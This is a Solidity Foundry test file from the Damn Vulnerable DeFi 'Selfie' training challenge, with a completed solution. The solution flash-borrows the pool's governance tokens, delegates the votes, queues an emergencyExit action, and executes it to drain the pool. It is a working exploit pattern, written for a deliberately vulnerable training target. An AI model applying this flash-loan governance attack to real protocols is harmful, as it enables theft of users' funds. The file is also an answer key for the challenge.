// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool, IERC20, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        console.log("player voting power: ", token.getVotes(player));

        FlashLoanReceiver flr = new FlashLoanReceiver(address(pool), governance, recovery);
        pool.flashLoan(flr, address(token), TOKENS_IN_POOL, "");

        vm.warp(block.timestamp + governance.getActionDelay() + 1);
        governance.executeAction(governance.getActionCounter() - 1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract FlashLoanReceiver is IERC3156FlashBorrower {
    address immutable pool;
    SimpleGovernance immutable governance;
    address immutable recovery;

    constructor(address _pool, SimpleGovernance _governance, address _recovery) {
        pool = _pool;
        governance = _governance;
        recovery = _recovery;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        DamnValuableVotes(token).delegate(address(this));
        uint256 votingPower = DamnValuableVotes(token).getVotes(address(this));
        console.log("my voting power: ", votingPower);
        bytes memory payload = abi.encodeCall(SelfiePool.emergencyExit, (recovery));
        governance.queueAction(address(pool), 0, payload);
        IERC20(token).approve(pool, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
